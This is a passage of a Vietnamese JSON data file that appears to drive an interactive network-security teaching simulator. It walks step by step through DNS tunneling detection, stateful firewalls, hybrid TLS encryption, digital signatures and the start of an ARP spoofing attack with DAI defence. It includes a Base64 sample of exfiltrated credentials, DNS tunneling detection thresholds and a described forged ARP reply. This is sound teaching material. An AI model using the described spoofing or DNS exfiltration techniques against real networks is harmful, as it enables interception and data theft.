              "cGFzc3dvcmQ5OTk=",
              "password999",
              "Thông tin bí mật hệ thống"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Hệ thống SOC phát hiện đường hầm DNS qua siêu dữ liệu",
        "desc": "Chuyên viên SOC sử dụng công cụ phân tích mạng (Zeek, SIEM) để nhận diện các dấu hiệu bất thường: độ dài truy vấn lớn (>60 ký tự), độ hỗn loạn entropy cao, và tần suất gửi bản ghi TXT bất thường.",
        "fromNode": "local_dns",
        "toNode": "soc_siem",
        "packetLabel": "SIEM Alert: DNS Tunneling",
        "status": "forward",
        "actionText": "SOC phát hiện bất thường: Chiều dài chuỗi > 60 ký tự, Entropy cao",
        "pdu": {
          "layer2": "Nhật ký kết nối Zeek / Syslog chuyển về SIEM",
          "layer3": "Phân tích lưu lượng IP nội bộ 192.168.1.100",
          "layer4": "Thống kê tỷ lệ truy vấn DNS TXT so với A/AAAA",
          "payload": "Cảnh báo bảo mật: Độ hỗn loạn Shannon Entropy = 4.85 (Ngưỡng nguy hiểm > 4.2)"
        },
        "deviceState": {
          "title": "Chỉ số nhận diện tấn công DNS Tunneling trên SIEM / IDS",
          "headers": [
            "Chỉ số giám sát",
            "Lưu lượng DNS thông thường",
            "Lưu lượng DNS Tunneling phát hiện"
          ],
          "rows": [
            [
              "Độ dài tên miền con",
              "Dưới 15 ký tự (mail, ftp, www)",
              "Lớn hơn 50 ký tự (chuỗi mã hóa)"
            ],
            [
              "Độ hỗn loạn Entropy",
              "Thấp (ngôn ngữ tự nhiên 2.0 - 3.5)",
              "Rất cao (> 4.2 do mã hóa Base64)"
            ],
            [
              "Loại bản ghi truy vấn",
              "90% là bản ghi A / AAAA thông thường",
              "Phần lớn là bản ghi TXT hoặc NULL"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Phương pháp phát hiện DNS Tunneling",
        "Nguyên lý kỹ thuật",
        "Hành động ứng phó SOC"
      ],
      "rows": [
        [
          "Phân tích độ dài truy vấn",
          "Kiểm tra số lượng ký tự trong trường QNAME",
          "Chặn truy vấn có tiền tố vượt quá ngưỡng an toàn"
        ],
        [
          "Độ hỗn loạn thông tin (Shannon Entropy)",
          "Đo lường tính ngẫu nhiên của chuỗi ký tự",
          "Cô lập thiết bị phát sinh truy vấn có entropy cao"
        ],
        [
          "Kiểm tra tỷ lệ loại bản ghi TXT/NULL",
          "Bản ghi TXT được dùng để truyền dữ liệu dung lượng lớn",
          "Giới hạn dung lượng phản hồi DNS và kiểm tra nội dung"
        ],
        [
          "Phân tích danh tiếng tên miền (Domain Reputation)",
          "Kiểm tra tên miền mới tạo (Newly Registered Domains)",
          "Chặn tên miền độc hại qua DNS Sinkholing / Cisco Umbrella"
        ]
      ]
    },
    "takeaway": "DNS Tunneling lợi dụng cổng UDP 53 được mở để vượt qua tường lửa; SOC phát hiện thông qua tên miền dài bất thường, độ hỗn loạn entropy cao và tỷ lệ bản ghi TXT lớn."
  },
  "stateful_firewall": {
    "title": "Tường lửa kiểm soát trạng thái (Stateful Firewall) so với Stateless ACL",
    "badge": "Network Security Infrastructure / Connection Inspection",
    "summary": "Tường lửa Stateful không kiểm tra từng gói tin riêng rẽ mà duy trì bảng trạng thái phiên (State Table) để theo dõi toàn bộ ngữ cảnh kết nối Lớp 3 và Lớp 4, tự động cho phép luồng phản hồi hợp lệ mà không cần mở cổng chiều vào thủ công.",
    "topology": {
      "nodes": [
        {
          "id": "inside_pc",
          "type": "pc",
          "label": "Inside PC (LAN)",
          "sub": "192.168.1.50:50123",
          "x": 80,
          "y": 80
        },
        {
          "id": "fw",
          "type": "firewall",
          "label": "Stateful Firewall",
          "sub": "State Table Active",
          "x": 260,
          "y": 80
        },
        {
          "id": "ext_web",
          "type": "server",
          "label": "External Web Server",
          "sub": "203.0.113.10:80",
          "x": 440,
          "y": 80
        },
        {
          "id": "attacker",
          "type": "attacker",
          "label": "Attacker (Outside)",
          "sub": "198.51.100.99",
          "x": 440,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "inside_pc",
          "to": "fw",
          "label": "Inside Interface"
        },
        {
          "from": "fw",
          "to": "ext_web",
          "label": "Outside Interface"
        },
        {
          "from": "attacker",
          "to": "fw",
          "label": "Lưu lượng độc hại Inbound"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Inside PC khởi tạo kết nối Web ra bên ngoài (Outbound)",
        "desc": "Người dùng nội bộ gửi gói tin TCP SYN tới Web Server bên ngoài. Gói tin đi vào giao diện Inside của tường lửa.",
        "fromNode": "inside_pc",
        "toNode": "fw",
        "packetLabel": "Outbound SYN",
        "status": "forward",
        "actionText": "Inside PC gửi gói tin TCP SYN ra ngoài Internet",
        "pdu": {
          "layer2": "Khung tin từ mạng LAN nội bộ an toàn (Security Level 100)",
          "layer3": "Src IP: 192.168.1.50 | Dst IP: 203.0.113.10",
          "layer4": "TCP Src Port: 50123 | Dst Port: 80 | Flags: SYN | Seq: 3000",
          "payload": "Khởi tạo yêu cầu tải trang web HTTP"
        },
        "deviceState": {
          "title": "Bảng chính sách an ninh (Security Policy Table)",
          "headers": [
            "Vùng nguồn (Source)",
            "Vùng đích (Dest)",
            "Hành động",
            "Chính sách kiểm tra"
          ],
          "rows": [
            [
              "Inside (Level 100)",
              "Outside (Level 0)",
              "PERMIT",
              "Stateful Inspection (Duyệt theo phiên)"
            ],
            [
              "Outside (Level 0)",
              "Inside (Level 100)",
              "DENY",
              "Mặc định chặn mọi kết nối khởi tạo từ ngoài"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Tường lửa kiểm tra chính sách và tạo mục trong State Table",
        "desc": "Tường lửa xác nhận lưu lượng từ vùng có độ tin cậy cao ra vùng ngoài là hợp lệ, cho phép gói tin đi qua và tự động ghi một mục mới vào bảng trạng thái (State Table).",
        "fromNode": "fw",
        "toNode": "ext_web",
        "packetLabel": "Forward SYN & Insert State",
        "status": "forward",
        "actionText": "Tường lửa cho phép và chèn bản ghi vào State Table",
        "pdu": {
          "layer2": "Đóng gói Ethernet qua cổng WAN Outside",
          "layer3": "Src IP: 192.168.1.50 | Dst IP: 203.0.113.10",
          "layer4": "TCP Port 50123 -> 80 | Trạng thái: SYN_SENT",
          "payload": "Lưu lại giá trị Sequence và Window trong bộ nhớ phiên."
        },
        "deviceState": {
          "title": "Bảng trạng thái kết nối của Tường lửa (Firewall State Table)",
          "headers": [
            "Giao thức",
            "Địa chỉ nguồn (Inside)",
            "Địa chỉ đích (Outside)",
            "Trạng thái phiên",
            "Thời gian hết hạn"
          ],
          "rows": [
            [
              "TCP",
              "192.168.1.50:50123",
              "203.0.113.10:80",
              "SYN_SENT",
              "Chờ phản hồi 30s"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Máy chủ ngoài gửi gói tin phản hồi (SYN-ACK) hợp lệ",
        "desc": "Web Server phản hồi bằng gói tin SYN-ACK. Gói tin này đi vào cổng Outside của tường lửa.",
        "fromNode": "ext_web",
        "toNode": "fw",
        "packetLabel": "Inbound SYN-ACK",
        "status": "forward",
        "actionText": "Gói phản hồi SYN-ACK đi tới cổng Outside của Firewall",
        "pdu": {
          "layer2": "Khung tin từ Internet gửi về",
          "layer3": "Src IP: 203.0.113.10 | Dst IP: 192.168.1.50",
          "layer4": "TCP Src Port: 80 | Dst Port: 50123 | Flags: SYN, ACK | Ack: 3001",
          "payload": "Phản hồi hợp lệ cho phiên kết nối do máy tính bên trong khởi xướng."
        },
        "deviceState": {
          "title": "Tra cứu bảng trạng thái khi nhận gói tin từ ngoài vào",
          "headers": [
            "Tiêu chí kiểm tra",
            "Kết quả tra cứu State Table",
            "Hành động của Firewall"
          ],
          "rows": [
            [
              "IP & Cổng đảo ngược",
              "Khớp với mục 192.168.1.50:50123 <-> 203.0.113.10:80",
              "CHO PHÉP (PERMIT DYNAMIC)"
            ],
            [
              "Số Sequence / Ack",
              "Hợp lệ theo trình tự TCP",
              "Cập nhật trạng thái thành ESTABLISHED"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Tường lửa cho phép gói tin phản hồi đi qua về máy tính LAN",
        "desc": "Vì gói tin khớp với bản ghi đang hoạt động trong State Table, tường lửa tự động cho phép gói tin đi qua mà không cần người quản trị phải cấu hình mở cổng Inbound thủ công.",
        "fromNode": "fw",
        "toNode": "inside_pc",
        "packetLabel": "Permit Return Traffic",
        "status": "forward",
        "actionText": "Chuyển tiếp gói tin phản hồi về máy tính nội bộ",
        "pdu": {
          "layer2": "Chuyển qua giao diện Inside tới Host 192.168.1.50",
          "layer3": "Src IP: 203.0.113.10 | Dst IP: 192.168.1.50",
          "layer4": "Flags: SYN, ACK",
          "payload": "Người dùng nội bộ tải trang web thành công."
        },
        "deviceState": {
          "title": "Bảng trạng thái sau khi bắt tay hoàn tất",
          "headers": [
            "Giao thức",
            "Địa chỉ bên trong",
            "Địa chỉ bên ngoài",
            "Trạng thái phiên",
            "Timeout"
          ],
          "rows": [
            [
              "TCP",
              "192.168.1.50:50123",
              "203.0.113.10:80",
              "ESTABLISHED",
              "3600 giây (1 giờ)"
            ]
          ]
        }
      },
      {
        "num": 5,
        "name": "Attacker gửi gói tin thăm dò không mời (Unsolicited Traffic)",
        "desc": "Kẻ tấn công từ ngoài Internet gửi gói tin bất kỳ nhằm vào mạng nội bộ. Tường lửa tra cứu State Table: không tìm thấy phiên kết nối nào khởi tạo trước đó. Tường lửa lập tức loại bỏ (Drop) gói tin.",
        "fromNode": "attacker",
        "toNode": "fw",
        "packetLabel": "Unsolicited Packet",
        "status": "drop",
        "actionText": "Tường lửa loại bỏ gói tin do không khớp bản ghi trong State Table",
        "pdu": {
          "layer2": "Khung tin từ nguồn không tin cậy ngoài Internet",
          "layer3": "Src IP: 198.51.100.99 | Dst IP: 192.168.1.50",
          "layer4": "TCP Dst Port: 445 / 80 / 3389",
          "payload": "Gói tin thăm dò hoặc tấn công không mời."
        },
        "deviceState": {
          "title": "Nhật ký ngăn chặn của Tường lửa (Firewall Drop Log)",
          "headers": [
            "Lý do loại bỏ",
            "Địa chỉ nguồn",
            "Địa chỉ đích",
            "Hành động"
          ],
          "rows": [
            [
              "Deny by No State Match",
              "198.51.100.99:45210",
              "192.168.1.50:445",
              "DROP & LOG"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Tiêu chí so sánh",
        "Stateless Packet Filtering (ACL)",
        "Stateful Inspection Firewall"
      ],
      "rows": [
        [
          "Nguyên lý kiểm tra",
          "Kiểm tra từng gói tin đơn lẻ dựa trên Header L3/L4",
          "Kiểm tra trong toàn bộ ngữ cảnh của phiên làm việc"
        ],
        [
          "Xử lý chiều về (Inbound)",
          "Phải mở sẵn cổng chiều vào bằng ACL, dễ bị tấn công",
          "Tự động cho phép luồng phản hồi hợp lệ qua State Table"
        ],
        [
          "Chống giả mạo cờ TCP",
          "Dễ bị đánh lừa bởi cờ ACK/SYN giả mạo",
          "Xác thực số Sequence và quy trình bắt tay thực tế"
        ],
        [
          "Tài nguyên phần cứng",
          "Tốn rất ít RAM và CPU",
          "Tiêu thụ bộ nhớ RAM để duy trì bảng phiên State Table"
        ]
      ]
    },
    "takeaway": "Stateful Firewall chỉ cho phép lưu lượng từ bên ngoài đi vào nếu nó là phản hồi cho một phiên làm việc hợp lệ đã được khởi xướng từ bên trong mạng nội bộ."
  },
  "crypto_asym_sym": {
    "title": "Mô hình mã hóa lai (Hybrid Encryption) trong giao thức SSL/TLS",
    "badge": "Cryptography & Endpoint Protection / Hybrid Encryption",
    "summary": "Mã hóa bất đối xứng (Public/Private Key) có tốc độ chậm nhưng giải quyết được bài toán trao đổi khóa an toàn. Mã hóa đối xứng (AES) có tốc độ rất nhanh. Hệ thống hiện đại kết hợp cả hai để tối ưu hiệu năng và bảo mật.",
    "topology": {
      "nodes": [
        {
          "id": "client",
          "type": "pc",
          "label": "Web Client (Trình duyệt)",
          "sub": "Tạo Session Key",
          "x": 80,
          "y": 80
        },
        {
          "id": "channel",
          "type": "cloud",
          "label": "Môi trường Internet",
          "sub": "Kênh truyền công cộng",
          "x": 260,
          "y": 80
        },
        {
          "id": "server",
          "type": "server",
          "label": "Web Server (HTTPS)",
          "sub": "Giữ Private Key bí mật",
          "x": 440,
          "y": 80
        }
      ],
      "links": [
        {
          "from": "client",
          "to": "channel",
          "label": "Client Hello / Key Exchange"
        },
        {
          "from": "channel",
          "to": "server",
          "label": "Server Certificate / Handshake"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Trao đổi chứng chỉ số chứa Public Key của Server",
        "desc": "Client kết nối tới Server qua HTTPS. Server gửi chứng chỉ số X.509 chứa Public Key của Server (đã được CA ký duyệt để chứng thực danh tính).",
        "fromNode": "server",
        "toNode": "client",
        "packetLabel": "Certificate (Server Public Key)",
        "status": "forward",
        "actionText": "Server gửi chứng chỉ số X.509 chứa Public Key cho Client",
        "pdu": {
          "layer2": "Khung tin truyền qua kênh mạng",
          "layer3": "Giao thức TLS Handshake Protocol",
          "layer4": "TCP Port 443 | TLS Record: Certificate Message",
          "payload": "X.509 Cert: Server RSA 2048-bit Public Key, Ký bởi DigiCert CA"
        },
        "deviceState": {
          "title": "Trạng thái xác thực chứng chỉ tại Trình duyệt Client",
          "headers": [
            "Tiêu chí xác minh",
            "Kết quả",
            "Ý nghĩa"
          ],
          "rows": [
            [
              "Chữ ký của CA (Certificate Authority)",
              "Hợp lệ (Trusted)",
              "Xác nhận Server đúng là chủ thể sở hữu"
            ],
            [
              "Thời hạn hiệu lực",
              "Còn hạn sử dụng",
              "Chứng chỉ chưa hết hạn"
            ],
            [
              "Danh sách thu hồi (CRL / OCSP)",
              "Không bị thu hồi",
              "Khóa công khai an toàn"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Client tạo Khóa phiên đối xứng ngẫu nhiên (Session Key)",
        "desc": "Client tự sinh một khóa phiên ngẫu nhiên (Pre-Master Secret / AES-256 Key). Khóa này sẽ được dùng để mã hóa đối xứng toàn bộ dữ liệu phiên duyệt web.",
        "fromNode": "client",
        "toNode": "client",
        "packetLabel": "Generate AES Key",
        "status": "forward",
        "actionText": "Client tạo khóa bí mật đối xứng AES-256 ngẫu nhiên",
        "pdu": {
          "layer2": "Thao tác tính toán nội bộ tại CPU Client",
          "layer3": "Sử dụng bộ sinh số ngẫu nhiên mật mã (CSPRNG)",
          "layer4": "Khóa đối xứng: 256 bits (32 bytes ngẫu nhiên)",
          "payload": "Khóa đối xứng này có tốc độ giải mã cực nhanh nhưng phải giữ bí mật tuyệt đối."
        },
        "deviceState": {
          "title": "Bảng quản lý khóa mật mã trên Client",
          "headers": [
            "Loại khóa",
            "Thuật toán",
            "Độ dài",
            "Quyền truy cập"
          ],
          "rows": [
            [
              "Session Key",
              "AES-256-GCM",
              "256 bits",
              "Lưu tạm trong RAM Client"
            ],
            [
              "Server Public Key",
              "RSA / ECC",
              "2048 / 256 bits",
              "Đọc từ chứng chỉ số"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Mã hóa Khóa phiên bằng Public Key của Server",
        "desc": "Client dùng Public Key của Server để mã hóa Khóa phiên này và truyền qua Internet. Nhờ toán học của mã hóa bất đối xứng, chỉ có duy nhất Private Key của Server mới giải mã được.",
        "fromNode": "client",
        "toNode": "server",
        "packetLabel": "Encrypted Session Key",
        "status": "forward",
        "actionText": "Client gửi Khóa phiên đã mã hóa bằng Server Public Key",
        "pdu": {
          "layer2": "Khung tin truyền qua Internet công cộng",
          "layer3": "TLS Client Key Exchange",
          "layer4": "TCP Port 443",
          "payload": "Bản mã RSA Encrypted(Session Key). Kẻ nghe lén (Sniffer) không thể giải mã nếu không có Private Key."
        },
        "deviceState": {
          "title": "Trạng thái bảo mật trên đường truyền Internet",
          "headers": [
            "Dữ liệu truyền qua mạng",
            "Khả năng nghe lén",
            "Yêu cầu giải mã"
          ],
          "rows": [
            [
              "Khóa phiên AES đã mã hóa",
              "Có thể bắt gói tin",
              "Bất khả thi nếu không có Private Key của Server"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Server giải mã thu về Khóa phiên bằng Private Key",
        "desc": "Server sử dụng Private Key tuyệt mật của mình để giải mã gói tin, thu được bản rõ của Khóa phiên đối xứng. Bây giờ cả hai bên đều sở hữu cùng một Khóa phiên bí mật.",
        "fromNode": "server",
        "toNode": "server",
        "packetLabel": "Decrypt with Private Key",
        "status": "forward",
        "actionText": "Server giải mã bằng Private Key thu được Khóa phiên AES",
        "pdu": {
          "layer2": "Xử lý tại Crypto Engine của Server",
          "layer3": "Private Key RSA: 2048 bits",
          "layer4": "Hoàn tất giai đoạn bắt tay TLS",
          "payload": "Server và Client đã chia sẻ chung một Khóa phiên đối xứng AES mà không bị lộ trên mạng."
        },
        "deviceState": {
          "title": "Bảng trạng thái bảo mật của phiên TLS",
          "headers": [
            "Bên",
            "Khóa sở hữu",
            "Thuật toán dữ liệu áp dụng"
          ],
          "rows": [
            [
              "Web Client",
              "Shared AES Session Key",
              "AES-256-GCM (Đối xứng)"
            ],
            [
              "Web Server",
              "Shared AES Session Key + Private Key",
              "AES-256-GCM (Đối xứng)"
            ]
          ]
        }
      },
      {
        "num": 5,
        "name": "Truyền dữ liệu dung lượng lớn tốc độ cao bằng mã hóa đối xứng",
        "desc": "Kể từ thời điểm này, toàn bộ dữ liệu HTTP (HTML, hình ảnh, API) được mã hóa bằng thuật toán đối xứng AES với tốc độ xử lý phần cứng cực nhanh.",
        "fromNode": "client",
        "toNode": "server",
        "packetLabel": "Symmetric Encrypted Data",
        "status": "forward",
        "actionText": "Truyền dữ liệu ứng dụng tốc độ cao bằng mã hóa đối xứng AES",
        "pdu": {
          "layer2": "Khung tin ứng dụng HTTPS an toàn",
          "layer3": "TLS Record Layer: Application Data Protocol",
          "layer4": "TCP Port 443 | Mã hóa AES-256-GCM với Auth Tag (Toàn vẹn)",
          "payload": "Dữ liệu ứng dụng được mã hóa đối xứng với tốc độ dây (Line rate)."
        },
        "deviceState": {
          "title": "Hiệu năng mã hóa lai (Hybrid Encryption Performance)",
          "headers": [
            "Giai đoạn",
            "Thuật toán",
            "Vai trò chính",
            "Đặc tính hiệu năng"
          ],
          "rows": [
            [
              "Thiết lập phiên",
              "RSA / ECDHE (Bất đối xứng)",
              "Trao đổi khóa an toàn",
              "Chậm, tốn CPU, chỉ dùng lúc bắt tay"
            ],
            [
              "Truyền dữ liệu",
              "AES-GCM (Đối xứng)",
              "Mã hóa luồng dữ liệu lớn",
              "Rất nhanh, hỗ trợ tăng tốc phần cứng AES-NI"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Thuật toán mật mã",
        "Loại hình mã hóa",
        "Độ dài khóa chuẩn",
        "Mục đích sử dụng chính"
      ],
      "rows": [
        [
          "AES (Advanced Encryption Standard)",
          "Đối xứng (Symmetric)",
          "128, 192, 256 bits",
          "Mã hóa dữ liệu số lượng lớn (Bulk Data Encryption)"
        ],
        [
          "DES / 3DES (Legacy)",
          "Đối xứng (Symmetric)",
          "56 / 168 bits",
          "Lỗi thời, không còn an toàn trước tấn công vét cạn"
        ],
        [
          "RSA",
          "Bất đối xứng (Asymmetric)",
          "2048, 4096 bits",
          "Trao đổi khóa bí mật, tạo chữ ký số (Digital Signature)"
        ],
        [
          "ECC (Elliptic Curve Cryptography)",
          "Bất đối xứng (Asymmetric)",
          "256, 384 bits",
          "Bảo mật tương đương RSA 3072-bit với độ dài khóa ngắn hơn"
        ]
      ]
    },
    "takeaway": "Mã hóa bất đối xứng giải quyết bài toán trao đổi khóa an toàn qua Internet; mã hóa đối xứng thực hiện truyền dữ liệu dung lượng lớn với tốc độ cao."
  },
  "digital_signature_hash": {
    "title": "Quy trình tạo và xác minh chữ ký số (Digital Signature) kết hợp hàm băm SHA-256",
    "badge": "Integrity & Non-Repudiation / Cryptographic Signatures",
    "summary": "Chữ ký số cung cấp ba tính chất an ninh cốt lõi: Tính toàn vẹn (Integrity - dữ liệu không bị sửa đổi), Tính xác thực nguồn gốc (Authentication), và Tính chống chối bỏ (Non-repudiation). Chữ ký số được tạo bằng cách băm dữ liệu rồi mã hóa giá trị băm đó bằng Private Key của người gửi.",
    "topology": {
      "nodes": [
        {
          "id": "sender",
          "type": "pc",
          "label": "Người gửi (Alice)",
          "sub": "Giữ Private Key của Alice",
          "x": 80,
          "y": 80
        },
        {
          "id": "net",
          "type": "cloud",
          "label": "Kênh truyền mạng",
          "sub": "Chuyển phát văn bản + Chữ ký",
          "x": 260,
          "y": 80
        },
        {
          "id": "receiver",
          "type": "pc",
          "label": "Người nhận (Bob)",
          "sub": "Có Public Key của Alice",
          "x": 440,
          "y": 80
        }
      ],
      "links": [
        {
          "from": "sender",
          "to": "net",
          "label": "Văn bản + Digital Signature"
        },
        {
          "from": "net",
          "to": "receiver",
          "label": "Tiếp nhận và kiểm tra"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Người gửi tính toán giá trị băm (Hash) của tài liệu bằng SHA-256",
        "desc": "Alice đưa văn bản gốc qua thuật toán băm mật mã một chiều SHA-256 để tạo ra chuỗi tóm lược thông điệp (Message Digest) cố định 256 bits.",
        "fromNode": "sender",
        "toNode": "sender",
        "packetLabel": "Compute SHA-256 Hash",
        "status": "forward",
        "actionText": "Tạo giá trị băm SHA-256 cố định 256 bits từ văn bản gốc",
        "pdu": {
          "layer2": "Tính toán nội bộ tại máy tính người gửi",
          "layer3": "Thuật toán băm một chiều SHA-256",
          "layer4": "Kích thước đầu ra cố định: 32 bytes (64 ký tự Hex)",
          "payload": "Hash = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        },
        "deviceState": {
          "title": "Bảng thuộc tính hàm băm mật mã",
          "headers": [
            "Đặc tính",
            "Nguyên lý kỹ thuật"
          ],
          "rows": [
            [
              "Tính một chiều (One-way)",
              "Không thể đảo ngược từ chuỗi băm để suy ra văn bản gốc"
            ],
            [
              "Hiệu ứng tuyết lở (Avalanche Effect)",
              "Đổi 1 ký tự trong văn bản sẽ làm thay đổi hơn 50% giá trị băm"
            ],
            [
              "Chống va chạm (Collision Resistance)",
              "Bất khả thi để tìm hai tài liệu khác nhau có cùng giá trị băm"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Mã hóa giá trị băm bằng Private Key của người gửi để tạo Chữ ký số",
        "desc": "Alice dùng Private Key bí mật của chính mình để mã hóa chuỗi băm nói trên. Kết quả mã hóa này chính là Chữ ký số (Digital Signature).",
        "fromNode": "sender",
        "toNode": "sender",
        "packetLabel": "Sign with Private Key",
        "status": "forward",
        "actionText": "Mã hóa chuỗi băm bằng Private Key của Alice -> Chữ ký số",
        "pdu": {
          "layer2": "Thao tác mật mã bất đối xứng RSA/ECDSA",
          "layer3": "Khóa sử dụng: ALICE_PRIVATE_KEY (Bí mật)",
          "layer4": "Đầu ra: Digital Signature Block",
          "payload": "Digital Signature = Encrypt(ALICE_PRIVATE_KEY, Hash_Alice)"
        },
        "deviceState": {
          "title": "Thành phần gói tin xuất xưởng từ Người gửi",
          "headers": [
            "Thành phần",
            "Dạng thức",
            "Mục đích"
          ],
          "rows": [
            [
              "Văn bản gốc",
              "Bản rõ (Plaintext) hoặc bản mã",
              "Nội dung cần truyền tải"
            ],
            [
              "Chữ ký số",
              "Chuỗi số mã hóa bởi Private Key",
              "Xác thực danh tính và chống giả mạo"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Gửi văn bản cùng chữ ký số qua mạng tới Người nhận",
        "desc": "Alice gửi đồng thời cả hai phần: Văn bản tài liệu và Chữ ký số đính kèm tới Bob qua mạng.",
        "fromNode": "sender",
        "toNode": "receiver",
        "packetLabel": "Doc + Digital Signature",
        "status": "forward",
        "actionText": "Truyền văn bản gốc kèm chữ ký số tới Bob",
        "pdu": {
          "layer2": "Khung tin mạng truyền qua Internet",
          "layer3": "Src IP: Alice | Dst IP: Bob",
          "layer4": "Giao thức truyền tải (S/MIME, PGP, hoặc HTTPS)",
          "payload": "[Document Content] + [Attached Digital Signature]"
        },
        "deviceState": {
          "title": "Trạng thái tiếp nhận tại máy tính Bob",
          "headers": [
            "Mục nhận được",
            "Tình trạng",
            "Thao tác tiếp theo"
          ],
          "rows": [
            [
              "Document",
              "Đã nhận",
              "Chuẩn bị tính toán lại mã băm độc lập"
            ],
            [
              "Digital Signature",
              "Đã nhận",
              "Chuẩn bị giải mã bằng Public Key của Alice"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Người nhận giải mã chữ ký bằng Public Key và so sánh mã băm",
        "desc": "Bob thực hiện 2 thao tác độc lập: 1) Tự tính mã băm SHA-256 từ văn bản nhận được; 2) Dùng Public Key của Alice giải mã chữ ký số thu về mã băm ban đầu. Sau đó so sánh 2 giá trị này.",
        "fromNode": "receiver",
        "toNode": "receiver",
        "packetLabel": "Verify & Compare Hashes",
        "status": "forward",
        "actionText": "So sánh Hash giải mã từ chữ ký với Hash tự tính toán",
        "pdu": {
          "layer2": "Xử lý kiểm tra mật mã tại máy tính Bob",
          "layer3": "Decrypted Hash = Decrypt(ALICE_PUBLIC_KEY, Signature)",
          "layer4": "Computed Hash = SHA256(Received Document)",
          "payload": "Kết quả: Decrypted Hash == Computed Hash (Trùng khớp 100%)"
        },
        "deviceState": {
          "title": "Bảng kiểm tra 3 tiêu chí an toàn thông tin của Chữ ký số",
          "headers": [
            "Tiêu chí",
            "Kết quả kiểm tra",
            "Ý nghĩa an ninh mạng"
          ],
          "rows": [
            [
              "Tính toàn vẹn (Integrity)",
              "Khớp mã băm 100%",
              "Văn bản không bị kẻ xấu sửa đổi trên đường truyền"
            ],
            [
              "Tính xác thực (Authentication)",
              "Giải mã thành công bằng Public Key của Alice",
              "Chắc chắn do chính Alice gửi"
            ],
            [
              "Tính chống chối bỏ (Non-repudiation)",
              "Chỉ Alice có Private Key tương ứng",
              "Alice không thể phủ nhận việc đã ký tài liệu"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "Thuật toán / Tiêu chuẩn",
        "Độ dài đầu ra",
        "Mức độ an toàn hiện tại"
      ],
      "rows": [
        [
          "MD5",
          "128 bits",
          "Không an toàn, đã bị phá vỡ bởi tấn công va chạm (Collision)"
        ],
        [
          "SHA-1",
          "160 bits",
          "Đã lỗi thời, không còn được khuyến nghị sử dụng"
        ],
        [
          "SHA-256 (SHA-2 Family)",
          "256 bits",
          "Chuẩn công nghiệp phổ biến và rất an toàn"
        ],
        [
          "SHA-3 (Keccak)",
          "224, 256, 384, 512 bits",
          "Chuẩn mới nhất của NIST, kháng tấn công cao"
        ]
      ]
    },
    "takeaway": "Chữ ký số là giá trị băm (Hash) được mã hóa bằng PRIVATE KEY của người gửi; người nhận sử dụng PUBLIC KEY của người gửi để giải mã và kiểm tra tính toàn vẹn cùng tính chống chối bỏ."
  },
  "arp_spoofing_mitm": {
    "title": "Tấn công giả mạo đầu độc bảng ARP (ARP Spoofing) và phòng vệ DAI",
    "badge": "Layer 2 Attacks & Mitigation / Dynamic ARP Inspection",
    "summary": "Giao thức ARP không có cơ chế xác thực nguồn gốc, chấp nhận các bản tin ARP Reply mà không cần kiểm tra trước đó có gửi ARP Request hay không. Kẻ tấn công gửi ARP giả mạo để đầu độc bộ nhớ đệm (ARP Poisoning), biến mình thành người trung gian (Man-in-the-Middle).",
    "topology": {
      "nodes": [
        {
          "id": "victim",
          "type": "pc",
          "label": "Host A (Nạn nhân)",
          "sub": "192.168.1.10 (MAC A)",
          "x": 80,
          "y": 70
        },
        {
          "id": "attacker",
          "type": "attacker",
          "label": "Attacker (Kẻ tấn công)",
          "sub": "192.168.1.99 (MAC X)",
          "x": 80,
          "y": 190
        },
        {
          "id": "sw",
          "type": "switch",
          "label": "Cisco Switch",
          "sub": "DAI & DHCP Snooping",
          "x": 260,
          "y": 130
        },
        {
          "id": "gw",
          "type": "router",
          "label": "Default Gateway",
          "sub": "192.168.1.1 (MAC G)",
          "x": 440,
          "y": 130
        }
      ],
      "links": [
        {
          "from": "victim",
          "to": "sw",
          "label": "Fa0/1 (Untrusted)"
        },
        {
          "from": "attacker",
          "to": "sw",
          "label": "Fa0/2 (Untrusted)"
        },
        {
          "from": "sw",
          "to": "gw",
          "label": "Gi0/1 (Trusted)"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Kẻ tấn công gửi gói tin ARP Reply giả mạo tới Nạn nhân",
        "desc": "Kẻ tấn công gửi gói Gratuitous ARP Reply tới Host A tuyên bố: 'IP 192.168.1.1 (Gateway) đang có địa chỉ MAC là MAC_X (của kẻ tấn công)'.",
        "fromNode": "attacker",
        "toNode": "victim",
        "packetLabel": "Spoofed ARP to Victim",
        "status": "forward",
        "actionText": "Kẻ tấn công gửi ARP Reply giả mạo tới Host A",
        "pdu": {
          "layer2": "Src MAC: MAC_X (Attacker) | Dst MAC: MAC_A (Victim) | Type: ARP (0x0806)",
          "layer3": "Không áp dụng tiêu đề IP (Giao thức ARP chạy trực tiếp trên Layer 2)",
          "layer4": "ARP Opcode: 2 (Reply) | Sender MAC: MAC_X | Sender IP: 192.168.1.1",
          "payload": "Kẻ tấn công mạo danh là Gateway để lừa Host A."
        },
        "deviceState": {
          "title": "Bảng ARP Cache của Host A sau khi bị đầu độc",
          "headers": [
            "Địa chỉ IP",
            "Địa chỉ MAC trong bộ đệm",
            "Loại",
            "Thực tế"
          ],
          "rows": [
            [
              "192.168.1.1 (Gateway)",
              "MAC_X (Attacker)",
              "DYNAMIC",
              "BỊ ĐẦU ĐỘC (Sai lệch)"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Kẻ tấn công gửi gói tin ARP Reply giả mạo tới Gateway",
